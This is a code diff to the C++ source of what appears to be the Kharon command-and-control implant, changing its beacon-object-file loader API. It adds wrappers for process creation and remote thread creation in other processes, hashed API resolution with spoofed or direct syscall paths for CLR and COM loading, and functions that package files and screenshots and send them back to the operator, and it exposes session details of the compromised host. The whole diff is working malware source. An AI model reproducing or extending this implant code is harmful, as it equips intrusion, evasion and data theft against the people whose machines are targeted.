@@ -35,6 +35,65 @@ auto DECLFN Coff::Output(
     Self->Pkg->SendOut( type, CommandID, (BYTE*)data, len );
 }
 
+auto DECLFN Coff::PrintfW(
+    INT  type,
+    PWCH fmt,
+    ...
+) -> VOID {
+    G_KHARON
+
+    va_list VaList;
+    va_list VaListCopy;
+
+    VOID*  MemRange = __builtin_return_address( 0 );
+    CHAR*  UUID     = nullptr;
+    int    MsgSize  = 0;
+    int    written  = 0;
+    WCHAR* MsgBuff  = nullptr;
+
+    va_start( VaList, fmt );
+
+    // Primeira cópia para calcular o tamanho
+    va_copy( VaListCopy, VaList );
+    MsgSize = Self->Msvcrt.k_vscwprintf( fmt, VaListCopy );
+    va_end( VaListCopy );
+
+    if ( MsgSize < 0 ) {
+        KhDbg( "Printf: vscwprintf size probe failed" );
+        goto _CLEANUP;
+    }
+
+    MsgBuff = ( WCHAR* )KhAlloc( ( MsgSize + 1 ) * sizeof( WCHAR ) );
+    if ( !MsgBuff ) {
+        KhDbg( "Printf: allocation failed" );
+        goto _CLEANUP;
+    }
+
+    // Segunda cópia para formatar a string
+    va_copy( VaListCopy, VaList );
+    written = Self->Msvcrt.k_vswprintf( MsgBuff, MsgSize + 1, fmt, VaListCopy );
+    va_end( VaListCopy );
+    
+    if ( written < 0 ) {
+        KhDbg( "Printf: vswprintf output failed" ); 
+        goto _CLEANUP;
+    }
+    
+    MsgBuff[written] = L'\0';
+
+    UUID = Self->Cf->GetTask( MemRange );
+    KhDbg( "Printf: sending task %s -> \"%ls\" [%d bytes]", UUID, MsgBuff, written * sizeof(WCHAR) );
+    Self->Pkg->SendMsgW( type, MsgBuff );
+
+_CLEANUP:
+    va_end( VaList );
+    va_end( VaListCopy );
+    
+    if ( MsgBuff ) {
+        KhFree( MsgBuff );
+    }
+}
+
 auto DECLFN Coff::Printf(
     INT  type,
     PCCH fmt,
@@ -50,7 +109,6 @@ auto DECLFN Coff::Printf(
     int   written  = 0;
     CHAR* MsgBuff  = nullptr;
 
-    // measure
     va_start( VaList, fmt );
     MsgSize = Self->Msvcrt.vsnprintf( nullptr, 0, fmt, VaList );
     va_end( VaList );
@@ -58,29 +116,25 @@ auto DECLFN Coff::Printf(
         KhDbg( "Printf: vsnprintf size probe failed" ); goto _KH_END;
     }
 
-    // allocate (size = MsgSize+1 for the NUL)
-    MsgBuff = ( CHAR* )hAlloc( MsgSize + 1 );
+    MsgBuff = ( CHAR* )KhAlloc( MsgSize + 1 );
     if ( !MsgBuff ) {
         KhDbg( "Printf: allocation failed" ); goto _KH_END;
     }
 
-    // format
     va_start( VaList, fmt );
     written = Self->Msvcrt.vsnprintf( MsgBuff, MsgSize + 1, fmt, VaList );
     va_end( VaList );
     if ( written < 0 ) {
         KhDbg( "Printf: vsnprintf output failed" ); goto _KH_END;
     }
-    MsgBuff[written] = '\0';  // just in case
+    MsgBuff[written] = '\0'; 
 
-    // send
     UUID = Self->Cf->GetTask( MemRange );
     KhDbg( "Printf: sending task %s -> \"%s\" [%d bytes]", UUID, MsgBuff, written );
-    Self->Pkg->SendMsg( type, MsgBuff );
+    Self->Pkg->SendMsgA( type, MsgBuff );
 
-    // cleanup
 _KH_END:
-    if ( MsgBuff ) hFree( MsgBuff );
+    if ( MsgBuff ) KhFree( MsgBuff );
 }
 
 auto DECLFN Coff::DataExtract(
@@ -119,7 +173,7 @@ auto DECLFN Coff::FmtAlloc(
 
     if ( !Fmt ) return;
 
-    Fmt->original = (CHAR*)hAlloc( Maxsz );
+    Fmt->original = (CHAR*)KhAlloc( Maxsz );
     Fmt->buffer   = Fmt->original;
     Fmt->length   = 0;
     Fmt->size     = Maxsz;
@@ -143,6 +197,29 @@ auto DECLFN Coff::FmtAppend(
     Fmt->length += Len;
 }
 
+auto DECLFN Coff::FmtPrintfW(
+    FMTP*  Fmt,
+    WCHAR* Data,
+    ...
+) -> VOID {
+    G_KHARON
+
+    va_list Args;
+    va_start( Args, Data );
+
+    size_t avail   = Fmt->size - Fmt->length - 1;
+    int    written = Self->Msvcrt.k_vswprintf( (WCHAR*)Fmt->buffer, avail, Data, Args );
+
+    va_end( Args );
+    if ( written < 0 ) {
+        KhDbg( "FmtPrintf: vswnprint error" );
+        return;
+    }
+
+    Fmt->buffer += written * sizeof(WCHAR);
+    Fmt->length += written;
+}
+
 auto DECLFN Coff::FmtPrintf(
     FMTP* Fmt,
     CHAR* Data,
@@ -151,9 +228,8 @@ auto DECLFN Coff::FmtPrintf(
     G_KHARON
 
     va_list Args;
-    va_start( Args, Data);
+    va_start( Args, Data );
 
-    // NUL space in FmtToString
     size_t avail = Fmt->size - Fmt->length - 1;
     int written = Self->Msvcrt.vsnprintf( Fmt->buffer, avail, Data, Args );
 
@@ -185,34 +261,29 @@ auto DECLFN Coff::FmtToString(
 ) -> PCHAR {
     G_KHARON
 
-    // verify buffer not NULL
     if ( !fmt || !fmt->original ) {
         if ( size ) *size = 0;
         return nullptr;
     }
 
-    // clamp invalid lengths
     if ( fmt->length < 0 ) {
         KhDbg( "FmtToString: negative length %d, resetting to 0", fmt->length);
         fmt->length = 0;
     }
 
-    // ensure room for trailing NUL
     if ( (UINT32)fmt->length >= fmt->size ) {
-        // grow by max(length+1, existing_size*2)
         UINT32 newSize = max( (UINT32)fmt->length + 1, fmt->size * 2 );
-        CHAR* newbuf = ( CHAR* )hAlloc( newSize );
-        if ( !newbuf ) {
+        CHAR*  Newbuf  = ( CHAR* )KhAlloc( newSize );
+        if ( !Newbuf ) {
             if ( size ) *size = 0;
             return nullptr;
         }
-        Mem::Copy( newbuf, fmt->original, fmt->length );
-        hFree( fmt->original );
-        fmt->original = newbuf;
+        Mem::Copy( Newbuf, fmt->original, fmt->length );
+        KhFree( fmt->original );
+        fmt->original = Newbuf;
         fmt->size     = newSize;
     }
 
-    // null-terminate
     fmt->original[fmt->length] = '\0';
 
     if ( size ) {
@@ -238,14 +309,23 @@ auto DECLFN Coff::GetSpawn(
 
     if ( ! buffer || length <= 0 || x86 ) return;
 
-    SIZE_T spawnLen = Str::LengthA( Self->Config.Postex.Spawnto );
+    WCHAR* wspawnto = Self->Config.Postex.Spawnto;
+
+    SIZE_T wspawnLen = Str::LengthW( wspawnto );
+    SIZE_T cspawnLen = ( wspawnLen / 2 );
+
+    CHAR* cspawnto = (CHAR*)KhAlloc( cspawnLen );
     
-    if ( spawnLen >= (SIZE_T)length ) {
-        spawnLen = length - 1;
+    if ( cspawnLen >= (SIZE_T)length ) {
+        cspawnLen = length - 1;
     }
 
-    Mem::Copy( buffer, Self->Config.Postex.Spawnto, spawnLen );
-    buffer[spawnLen] = '\0';  
+    Str::WCharToChar( cspawnto, wspawnto, cspawnLen + 1 );
+
+    Mem::Copy( buffer, cspawnto, cspawnLen );
+    buffer[cspawnLen] = '\0';  
+
+    KhFree( cspawnto );
 }
 
 auto DECLFN Coff::FmtFree(
@@ -256,7 +336,7 @@ auto DECLFN Coff::FmtFree(
     if ( !Fmt ) return;
 
     if ( Fmt->original ) {
-        hFree( Fmt->original );
+        KhFree( Fmt->original );
         Fmt->original = nullptr;
     }
     
@@ -282,6 +362,172 @@ auto DECLFN Coff::WriteProcessMemory(
 )->BOOL {
     G_KHARON
     return Self->Mm->Write( BaseAddress, (BYTE*)Buffer, Size, Written, hProcess );
+}
+
+auto DECLFN Coff::CreateProcessW(
+    _In_  WCHAR*                Application,
+    _In_  WCHAR*                Command,
+    _In_  LPSECURITY_ATTRIBUTES PsAttributes,
+    _In_  LPSECURITY_ATTRIBUTES ThreadAttributes,
+    _In_  BOOL                  Inherit,
+    _In_  ULONG                 Flags,
+    _In_  PVOID                 Env,
+    _In_  WCHAR*                CurrentDir,
+    _In_  STARTUPINFOW*         StartupInfo,
+    _Out_ PROCESS_INFORMATION* PsInfo
+) -> BOOL {
+    G_KHARON
+
+    return Self->Ps->Create( Application, Command, Flags, PsAttributes, ThreadAttributes, Inherit, Env, CurrentDir, StartupInfo, PsInfo );
+}
+
+auto DECLFN Coff::CreateThread(
+    LPSECURITY_ATTRIBUTES  Attributes,
+    SIZE_T                 StackSize,
+    LPTHREAD_START_ROUTINE Start,
+    PVOID                  Parameter,
+    ULONG                  Flags
+) -> HANDLE {
+    G_KHARON
+    
+    return Self->Td->Create( NtCurrentProcess(), (PVOID)Start, Parameter, StackSize, Flags, nullptr, Attributes);
+}
+
+auto DECLFN Coff::HeapAlloc(
+    _In_ ULONG size
+) -> PVOID {
+    G_KHARON
+
+    return Self->Hp->Alloc( size );
+}
+
+auto DECLFN Coff::HeapReAlloc(
+    _In_ PVOID block,
+    _In_ ULONG size
+) -> PVOID {
+    G_KHARON
+
+    return Self->Hp->ReAlloc( block, size );
+}
+
+auto DECLFN Coff::HeapFree(
+    _In_ PVOID block
+) -> BOOL {
+    G_KHARON
+
+    return Self->Hp->Free( block );
+}
+
+auto DECLFN Coff::HeapCheckPtr(
+    _In_ PVOID block
+) -> BOOL {
+    G_KHARON
+
+    return Self->Hp->CheckPtr( block );
+}
+
+auto DECLFN Coff::PkgInt8(
+    _In_ BYTE  Data,
+    _In_ PCHAR UUID
+) -> VOID {
+    G_KHARON
+
+    PACKAGE* Pkg = nullptr;
+
+    if ( ! UUID ) {
+        Pkg = Self->Pkg->Shared;
+    } else {
+        JOBS* Job = Self->Jbs->GetByUUID( UUID );
+        Pkg = Job->Pkg;
+    }
+
+    return Self->Pkg->Byte( Pkg, Data );
+};
+
+auto DECLFN Coff::PkgInt16(
+    _In_ INT16 Data,
+    _In_ PCHAR UUID
+) -> VOID {
+    G_KHARON
+
+    PACKAGE* Pkg = nullptr;
+
+    if ( ! UUID ) {
+        Pkg = Self->Pkg->Shared;
+    } else {
+        JOBS* Job = Self->Jbs->GetByUUID( UUID );
+        Pkg = Job->Pkg;
+    }
+
+    return Self->Pkg->Int16( Pkg, Data );
+};
+
+auto DECLFN Coff::PkgInt32(
+    _In_ INT32 Data,
+    _In_ PCHAR UUID
+) -> VOID {
+    G_KHARON
+
+    PACKAGE* Pkg = nullptr;
+
+    if ( ! UUID ) {
+        Pkg = Self->Pkg->Shared;
+    } else {
+        JOBS* Job = Self->Jbs->GetByUUID( UUID );
+        Pkg = Job->Pkg;
+    }
+
+    return Self->Pkg->Int32( Pkg, Data );
+}
+
+auto DECLFN Coff::PkgInt64(
+    _In_ INT32 Data,
+    _In_ PCHAR UUID
+) -> VOID {
+    G_KHARON
+
+    PACKAGE* Pkg = nullptr;
+
+    if ( ! UUID ) {
+        Pkg = Self->Pkg->Shared;
+    } else {
+        JOBS* Job = Self->Jbs->GetByUUID( UUID );
+        Pkg = Job->Pkg;
+    }
+
+    return Self->Pkg->Int64( Pkg, Data );
+}
+
+auto DECLFN Coff::PkgBytes(
+    _In_ PBYTE Buffer,
+    _In_ ULONG Length,
+    _In_ PCHAR UUID
+) -> VOID {
+    G_KHARON
+
+    PACKAGE* Pkg = nullptr;
+
+    if ( ! UUID ) {
+        Pkg = Self->Pkg->Shared;
+    } else {
+        JOBS* Job = Self->Jbs->GetByUUID( UUID );
+        Pkg = Job->Pkg;
+    }
+
+    return Self->Pkg->Bytes( Pkg, Buffer, Length );
+}
+
+auto DECLFN Coff::CreateRemoteThread(
+    HANDLE Handle, LPSECURITY_ATTRIBUTES Attributes, 
+    SIZE_T                 StackSize, 
+    LPTHREAD_START_ROUTINE Start, 
+    LPVOID                 Parameter, 
+    DWORD                  Flags, 
+    LPDWORD                ThreadId
+) -> HANDLE {
+    G_KHARON
+
+    return Self->Td->Create( Handle, (PVOID)Start, Parameter, StackSize, Flags, ThreadId, Attributes );
 }
 
 auto DECLFN Coff::ReadProcessMemory(
@@ -367,71 +613,25 @@ auto DECLFN Coff::LoadLibraryW(
     return (HMODULE)Self->Lib->Load( LibA );
 }
 
-auto DECLFN Coff::DriAlloc(
-    SIZE_T Size, 
-    ULONG  Protect, 
-    HANDLE Handle
-) -> PVOID {
-    G_KHARON
-
-    return Self->Mm->DripAlloc( Size, Protect, Handle );
-}
-
-auto DECLFN Coff::WriteApc(
-    HANDLE Handle, 
-    PVOID  Base, 
-    BYTE*  Buffer, 
-    ULONG  Size
-) -> BOOL {
-    G_KHARON
-
-    return Self->Mm->WriteAPC( Handle, Base, Buffer, Size );
-}
-
 auto DECLFN Coff::CLRCreateInstance(
     REFCLSID clsid, REFIID riid, LPVOID* ppInterface
 ) -> HRESULT {
     G_KHARON
 
-    if (!ppInterface) {
-        return E_POINTER;
+    UPTR Mscoree = 0;
+    HRESULT (*CLRCreateInstance)(CLSID, REFIID, PVOID*);
+
+    if ( ! ( Mscoree = LdrLoad::Module( Hsh::Str<char>("mscoree.dll") ) ) ) {
+        Mscoree = Self->Lib->Load( "mscoree.dll" );
     }
 
-    if ( Self->Config.Syscall ) {
-        struct GUID_PACK {
-            UPTR part1;
-            UPTR part2;
-        };
-        
-        GUID_PACK clsid_pack = {
-            *reinterpret_cast<const UPTR*>(&clsid.Data1),
-            *reinterpret_cast<const UPTR*>(&clsid.Data2)
-        };
-        
-        GUID_PACK riid_pack = {
-            *reinterpret_cast<const UPTR*>(&riid.Data1),
-            *reinterpret_cast<const UPTR*>(&riid.Data2)
-        };
+    CLRCreateInstance = (decltype(CLRCreateInstance))LdrLoad::_Api( Mscoree, Hsh::Str<char>( "CLRCreateInstance" ) );
 
-        return static_cast<HRESULT>(Self->Spf->Call(
-            reinterpret_cast<UPTR>(Self->Mscoree.CLRCreateInstance),
-            clsid_pack.part1,
-            clsid_pack.part2,
-            reinterpret_cast<UPTR>(&clsid.Data3),
-            reinterpret_cast<UPTR>(clsid.Data4),
-            riid_pack.part1,
-            riid_pack.part2,
-            reinterpret_cast<UPTR>(&riid.Data3),
-            reinterpret_cast<UPTR>(riid.Data4),
-            reinterpret_cast<UPTR>(ppInterface)
-        ));
-    } else {
-        return Self->Mscoree.CLRCreateInstance(
-            clsid,
-            riid,
-            ppInterface
-        );
-    }
+    return CLRCreateInstance(
+        clsid,
+        riid,
+        ppInterface
+    );
 }
 
 auto DECLFN Coff::SetThreadContext(
@@ -454,7 +654,14 @@ auto DECLFN Coff::CoInitialize(
     LPVOID pvReserved
 ) -> HRESULT {
     G_KHARON
-    return (HRESULT)Self->Spf->Call( (UPTR)Self->Ole32.CoInitialize, 0, (UPTR)pvReserved );
+
+    HRESULT(*khCoInitialize)(PVOID) = (decltype(khCoInitialize))LdrLoad::_Api( LdrLoad::Module( Hsh::Str( "ole32.dll" ) ), Hsh::Str("CoInitialize") );
+
+    if ( Self->Config.Syscall ) {
+        return (HRESULT)Self->Spf->Call( (UPTR)khCoInitialize, 0, (UPTR)pvReserved );
+    }
+
+    return khCoInitialize( pvReserved );
 }
 
 auto DECLFN Coff::CoInitializeEx(
@@ -462,7 +669,14 @@ auto DECLFN Coff::CoInitializeEx(
     DWORD  dwCoInit
 ) -> HRESULT {
     G_KHARON
-    return (HRESULT)Self->Spf->Call( (UPTR)Self->Ole32.CoInitializeEx, 0, (UPTR)pvReserved, dwCoInit );
+
+    HRESULT(*khCoInitializeEx)(PVOID, DWORD) = (decltype(khCoInitializeEx))LdrLoad::_Api( LdrLoad::Module( Hsh::Str( "ole32.dll" ) ), Hsh::Str("CoInitializeEx") );
+
+    if ( Self->Config.Syscall ) {
+        return (HRESULT)Self->Spf->Call( (UPTR)khCoInitializeEx, 0, (UPTR)pvReserved, dwCoInit );
+    }
+
+    return khCoInitializeEx( pvReserved, dwCoInit );
 }
 
 auto Coff::UseToken(
@@ -499,8 +713,8 @@ auto Coff::RmValue(
                 Prev->Next = Current->Next;
             }
 
-            hFree( Current->Key );
-            hFree( Current );
+            KhFree( Current->Key );
+            KhFree( Current );
             
             return TRUE;
         }
@@ -520,13 +734,13 @@ auto Coff::AddValue(
 
     if ( !key || Self->Cf->GetValue( key ) ) return FALSE;
 
-    VALUE_DICT* NewData = (VALUE_DICT*)hAlloc( sizeof( VALUE_DICT ) );
+    VALUE_DICT* NewData = (VALUE_DICT*)KhAlloc( sizeof( VALUE_DICT ) );
     if ( ! NewData ) return FALSE;
     
     size_t keyLen = Str::LengthA( key );
-    NewData->Key  = (CHAR*)hAlloc( keyLen + 1 );
+    NewData->Key  = (CHAR*)KhAlloc( keyLen + 1 );
     if ( ! NewData->Key) {
-        hFree(NewData);
+        KhFree(NewData);
         return FALSE;
     }
 
@@ -563,4 +777,92 @@ auto Coff::GetValue(
     }
     
     return nullptr;
+}
+
+auto Coff::Information( BEACON_INFO* info ) -> BOOL {
+    G_KHARON
+
+    if ( ! info ) return FALSE;
+
+    info->BeaconPtr    = (PBYTE)Self->Session.Base.Start;
+    info->BeaconLength = Self->Session.Base.Length;
+    
+    info->Session.AgentId       = Self->Session.AgentID;
+    info->Session.CommandLine   = Self->Session.CommandLine;
+    info->Session.ImagePath     = Self->Session.ImagePath;
+    info->Session.Elevated      = Self->Session.Elevated;
+    info->Session.ProcessId     = Self->Session.ProcessID;
+
+    info->HeapRecords.EntryCount = Self->Hp->Count;
+    info->HeapRecords.NodeHead   = Self->Hp->Node;
+
+    info->Config = &Self->Config;
+
+    return TRUE;
+}
+
+auto DECLFN Coff::AxDownloadMemory(
+    _In_ CHAR*       filename,
+    _In_ CHAR*       data,
+    _In_ INT32       length
+) -> VOID {
+    G_KHARON
+
+    if ( ! filename || ! data || length <= 0 ) {
+        KhDbg( "AxDownloadMemory: invalid parameters" );
+        return;
+    }
+
+    VOID* MemRange  = __builtin_return_address( 0 );
+    ULONG CommandID = Self->Cf->GetCmdID( MemRange );
+
+    PACKAGE* TmpPkg = (PACKAGE*)KhAlloc( sizeof( PACKAGE ) );
+    if ( ! TmpPkg ) {
+        KhDbg( "AxDownloadMemory: package allocation failed" );
+        return;
+    }
+
+    TmpPkg->Buffer = PTR( KhAlloc( sizeof( BYTE ) ) );
+    TmpPkg->Length = 0;
+
+    Self->Pkg->Str( TmpPkg, filename );
+    Self->Pkg->Bytes( TmpPkg, (BYTE*)data, (ULONG)length );
+
+    Self->Pkg->SendOut( CALLBACK_AX_DOWNLOAD_MEM, CommandID, (BYTE*)TmpPkg->Buffer, (INT32)TmpPkg->Length );
+
+    Self->Pkg->Destroy( TmpPkg );
+}
+
+auto DECLFN Coff::AxAddScreenshot(
+    _In_ CHAR*       note,
+    _In_ CHAR*       data,
+    _In_ INT32       length
+) -> VOID {
+    G_KHARON
+
+    if ( ! data || length <= 0 ) {
+        return;
+    }
+
+    if ( ! note ) {
+        note = (CHAR*)"";
+    }
+
+    VOID* MemRange  = __builtin_return_address( 0 );
+    ULONG CommandID = Self->Cf->GetCmdID( MemRange );
+
+    PACKAGE* TmpPkg = (PACKAGE*)KhAlloc( sizeof( PACKAGE ) );
+    if ( ! TmpPkg ) {
+        return;
+    }
+
+    TmpPkg->Buffer = PTR( KhAlloc( sizeof( BYTE ) ) );
+    TmpPkg->Length = 0;
+
+    Self->Pkg->Str( TmpPkg, note );
+    Self->Pkg->Bytes( TmpPkg, (BYTE*)data, (ULONG)length );
+
+    Self->Pkg->SendOut( CALLBACK_AX_SCREENSHOT, CommandID, (BYTE*)TmpPkg->Buffer, (INT32)TmpPkg->Length );
+
+    Self->Pkg->Destroy( TmpPkg );
 }
